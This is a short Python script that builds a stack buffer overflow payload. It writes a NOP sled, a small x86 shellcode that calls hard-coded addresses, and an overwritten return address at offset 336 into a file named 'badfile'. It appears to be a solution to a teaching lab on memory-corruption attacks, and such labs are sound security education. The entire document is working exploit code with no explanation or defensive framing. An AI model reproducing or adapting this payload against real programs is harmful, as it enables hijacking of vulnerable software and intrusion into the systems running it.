#!/usr/bin/python3
import sys 
 
shellcode= ( 
"\xBB\xA2\x62\x55\x56\xFF\xD3\x50\xBB\x86\x62\x55\x56\xFF\xD3"
).encode('latin-1') 
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(2030)) 
# Put the shellcode at the end 
start = 2030 - len(shellcode) 
content[start:] = shellcode 
 
# Put the address at offset 336 
ret = 0xffffcc40 + 0x250 
content[336:340] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 

